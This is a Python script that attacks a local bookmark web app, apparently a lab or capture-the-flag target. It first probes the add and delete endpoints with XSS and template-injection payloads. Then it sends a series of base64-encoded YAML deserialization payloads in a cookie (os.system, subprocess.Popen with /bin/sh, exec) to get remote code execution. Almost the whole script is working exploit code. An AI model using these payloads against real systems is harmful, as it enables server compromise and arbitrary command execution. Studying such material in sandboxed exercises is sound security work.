import requests
import base64
import time

TARGET = "http://127.0.0.1:32979"
session = requests.Session()

print("CLEARING BOOKMARKS AND TESTING FRESH STATE")
print("=" * 60)

# First, reset to empty bookmarks
empty_payload = "W10K"  # base64 for "[]\n" - empty YAML list
cookies = {'user': 'f99d00962aa7465fa151128d2318d75d', 'bookmarks': empty_payload}
response = session.get(f"{TARGET}/list", cookies=cookies, timeout=10)
print(f"Reset bookmarks: {response.status_code}")

# Add a test bookmark
response = session.post(f"{TARGET}/add", data={'name': 'testbookmark123', 'url': 'http://example.com'}, timeout=10)
print(f"Add bookmark: {response.status_code}")

# Check current bookmarks
response = session.get(f"{TARGET}/list", cookies=cookies, timeout=10)
print(f"Current bookmarks page size: {len(response.text)}B")

# Try to delete the bookmark we just created
delete_params = [
    ('normal', 'testbookmark123'),
    ('with_space', 'testbookmark123 '),
    ('url_encoded', 'testbookmark123%00'),
]

for name, param in delete_params:
    try:
        response = session.get(f"{TARGET}/delete", params={'name': param}, timeout=10)
        print(f"Delete '{name}': Status {response.status_code}, Size {len(response.text)}B")
    except Exception as e:
        print(f"Delete '{name}': Exception - {str(e)[:50]}")

print("\n" + "=" * 60)
print("TESTING ADD ENDPOINT FOR XSS/STORAGE VULNERABILITIES")
print("=" * 60)

# Try XSS in the add endpoint
xss_tests = [
    ("script_tag", "<script>alert(1)</script>"),
    ("img_onerror", '<img src=x onerror=alert(1)>'),
    ("svg_onload", '<svg onload=alert(1)>'),
    ("javascript_proto", "javascript:alert(1)"),
    ("template_injection", "{{7*7}}"),
    ("angular_expression", "{{constructor.constructor('alert(1)')()}}"),
]

for name, payload in xss_tests:
    try:
        response = session.post(f"{TARGET}/add", data={'name': payload, 'url': 'http://test.com'}, timeout=10)
        print(f"\n[{name}] Payload: {payload[:40]}...")
        print(f"Status: {response.status_code}")
        
        # Check if redirected and look at the list page
        if response.status_code in [200, 302]:
            list_response = session.get(f"{TARGET}/list", timeout=10)
            if payload in list_response.text:
                print(f"  [X] Payload stored literally")
            elif '&lt;' in list_response.text:
                print(f"  [FILTERED] HTML encoded")
            elif 'alert' in list_response.text and '<script>' not in list_response.text:
                print(f"  [!] Potential XSS - check manually")
                
    except Exception as e:
        print(f"[{name}] Exception: {str(e)[:50]}")

print("\n" + "=" * 60)
print("FINAL ATTEMPT: YAML CONSTRUCTORS THAT EXECUTE ON INIT")
print("=" * 60)

# Some YAML constructors execute code during __init__
# Let's try a few more
final_yaml_tests = [
    # subprocess with list
    ("subprocess_list", """!!python/object/new:subprocess.Popen
listargs:
  - ["/bin/sh", "-c", "id"]
"""),
    
    # __reduce_ex__ approach
    ("reduce_ex", """!!python/reduce
- os.system
- [id]
"""),
    
    # Try to use __getstate__ / __setstate__
    ("setstate", """!!python/object:new
state: !!python/object/apply:os.system ["id"]
"""),
    
    # Combined approach with UrlObj as base
    ("url_obj_exploit", """!!python/object:app.models.UrlObj
state:
  - !!python/object/apply:os.system
    args: ["id"]
"""),
    
    # Ext trick
    ("ext_trick", """!!python/object/apply:__builtins__.exec
args:
  - "import os; os.system('id')"
"""),
    
    # Method resolution trick
    ("mro_trick", """!!python/object/new:object.__new__
args:
  - !!python/name:os.popen
"""),
]

for name, payload in final_yaml_tests:
    try:
        encoded = base64.b64encode(payload.encode()).decode()
        cookies = {'user': 'f99d00962aa7465fa151128d2318d75d', 'bookmarks': encoded}
        response = session.get(f"{TARGET}/list", cookies=cookies, timeout=10)
        
        print(f"\n[{name}] Status: {response.status_code} | Size: {len(response.text)}B")
        
        if response.status_code == 200 and len(response.text) > 2000:
            print(f"  [DETAIL] Response exceed baseline, may contain data")
            
    except Exception as e:
        print(f"[{name}] Status: ERROR | {str(e)[:50]}")

print("\n" + "=" * 60)
print("COMPREHENSIVE RCE AUDIT COMPLETE")
